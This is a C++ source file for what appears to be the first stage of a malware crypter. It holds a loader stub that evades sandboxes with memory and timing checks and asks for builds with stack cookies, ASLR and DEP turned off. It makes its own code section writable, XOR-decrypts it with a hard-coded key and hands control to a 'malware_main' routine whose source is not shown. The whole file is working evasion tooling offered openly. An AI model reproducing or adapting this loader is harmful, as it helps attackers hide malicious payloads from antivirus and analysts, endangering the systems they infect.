// loader.cpp : Defines the entry point for the console application.
//
// WORKS IN STAGES.
// This project is stage one
// is just a program that has a .code and .stub section
// 

/*
* Important to disable certain things
C/C++ settings
* /GS - security cookies
* /MTD for debug, /MT for release - statically include microsoft runtime library
LINKER SETTINGS
 all stored in advanced tab
* /DYNAMICBASE:NO - prevent dynamic base address
* /FIXED - fixed base address
* /NXCOMPAT:NO - remove data execution prevention
*/

//will be patched by cryptor
#define CODE_BASE_ADDRESS 0x15151515 
//will be patched by cryptor
#define CODE_SIZE	0x14141414

#include "../cryptor_sig.h"
#include <Windows.h>
#include <stdio.h>
//#include "malware_external.h"
#include "../remove_pe_header.h"
#include "../anti_vm.h"

//this contains the malware main routine 
#pragma section(CODE_SEG_NAME,read,execute)
#pragma code_seg(CODE_SEG_NAME)
#pragma comment(linker,CODE_SEG_LINK)
//include this here to ensure the code is encased in the code section
#include "malware_external.h"

//this contains the decryptor code. the stub...
#pragma section(STUB_SEG_NAME,execute,read)
#pragma code_seg(STUB_SEG_NAME) //to make no dataseg lol

#define TOO_MUCH_MEM 100000000
#define MAX_OP 100000000

int decryptCodeSection ( );	

int main ( ) {
	//malware_main ( );
	//check if in vm
	//begin memory test
	
	char * memdmp = NULL;
	memdmp = (char *)malloc(TOO_MUCH_MEM);
	if ( memdmp != NULL )
	{
		//mem test passed
		memset ( memdmp, 00, TOO_MUCH_MEM );
		free ( memdmp );

		//now test for counter
		int cpt = 0;
		int i = 0;
		for ( i = 0; i < MAX_OP; i++ )
		{
			cpt++;
		}
		if ( cpt == MAX_OP )
		{
			//counter passed
/*
			if ( remove_pe_header ( ) ) {
				return 1;
			}*/
			
			//if ( antivm ( ) ) {
				if ( decryptCodeSection ( ) ) {
				//if ( 1 ) {
					printf ( "[+] exited decryptCodeSection(), entering realmain()\n" );
					malware_main ( );
					printf ( "\n malware_main() exited\n" );
				}
			//}
			return 0;
		}
	}
}

/*
*	This function iterates over buffer, for the entirety of buffer_size,
*	checking for the first byte of pattern. Then it checks for the entirety
*	of pattern size until a match has been found
*/
int indexOf ( unsigned char *buffer, size_t buffer_size, unsigned char *pattern, size_t pattern_size ) {
	printf ( "\nBUFF BYTE %x:SIZE %d\nPTRN BYTE %x:SIZE %d\n", buffer, buffer_size, pattern, pattern_size );
	//	for (int i = 0; i < pattern_size; i++) {
	//		printf("%x", pattern[i]);
	//	}
	//	printf("\n\n");
	if ( pattern_size > buffer_size ) {
		printf ( "indexOf: pattern is bigger than buffer size\n" );
		return -1;
	}

	int j;
	int i;
	for ( i = 0; i < (int) (buffer_size - pattern_size); i++ ) {
		for ( j = 0; j < (int) (pattern_size - 1); j++ ) {
			if ( buffer[ i + j ] != pattern[ j ] ) {
				//the buffer location don't matchy match
				break;
			}
			printf ( "Matching byte %x at address %d\n", buffer[ i + j ], &buffer[ i + j ] );
			printf ( "Value i: %d; Value j: %d\n", i, j );
			//printf ( "%x", buffer[ i + j ] );
			/*if ( j + 1 == pattern_size - 1 ) {
			printf ( "indexOf: pattern was found in buffer at offset %d\n", i );
			return i;
			}*/
			//plus 1 to account for 0 indexed arrays, subtract 1 to account for null byte
			if ( j + 1 == pattern_size - 1 ) {
				printf ( "Pattern has been matched at buffer offset %d | 0x%02x\n", i, i );
				return i;
			}
		}
	}
	printf ( "\nindexOf: could not find pattern\n" );
	return -1;
}

int decryptCodeSection ( ) {
	printf("[+] Entered decryptCodeSection()\n");
	unsigned char *ptr;
	long int i;
	long int nbytes;
	int cpt = 0;
	BOOL bProtect = FALSE;
	BYTE  key[ ] = { 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF };
	int keyLength = sizeof ( key );
	DWORD dwProtect = 0;
	int ret = 0;
	BYTE sig[ ] = { 0x13, 0x13, 0x13, 0x13, 0x00 };
	int sigLength = sizeof ( sig );

	/*BYTE used to avoid buffer overrun thingy
	*	(http://msdn.microsoft.com/en-us/library/8dbf701c.aspx)
	*/

	ptr = ( unsigned char * )CODE_BASE_ADDRESS;/* 2 b patched by cryptor */
	nbytes = CODE_SIZE; /* 2 b patched by cryptor */

	printf("[*] Code Base Address: 0x%02x\n", ptr);
	printf("[+] Code Size: %02x\n",nbytes);

	printf ( "[*] Marking memory as writeable\n" );
	
	//make code section writeable
	bProtect = VirtualProtect ( ( LPVOID )ptr, nbytes, PAGE_EXECUTE_READWRITE, &dwProtect );
	if ( bProtect == FALSE ) {
		return 0;
	}

	/* 
	* ptr is the address of the .code seg. this xors every byte for the byte of the key,
	* which cycles from 0 - 7. cpt is which byte of code is being xorred
	*/

	printf("[*] XORing\n");
	//iterateKey(key, 8);
	for ( i = 0; i < nbytes; i++ ) {
		//printf ( "[*] Current key is %02X\n", key[ cpt ] );
		ptr[ i ] = ptr[ i ] ^ key[ cpt ];
		//printf ( "first byte had ptr[%d] xorred with key[%d]\n", i, cpt );
		cpt += 1;
		if ( cpt == keyLength ) { //return to beginning of xor key if reached end
			cpt = 0;
		}
	}
	ret = indexOf ( ptr, nbytes, sig, sigLength );
	if ( ret == -1 ) {
		return 0;
	}

	printf ( "\nSignature found at 0x%02x\n", ptr + ret );
	
	//bProtect = VirtualProtect ( ( LPVOID )ptr, nbytes, dwProtect, &dwProtect );
	//if ( bProtect == FALSE ) {
	//	return 0;
	//}

	return 1;
}
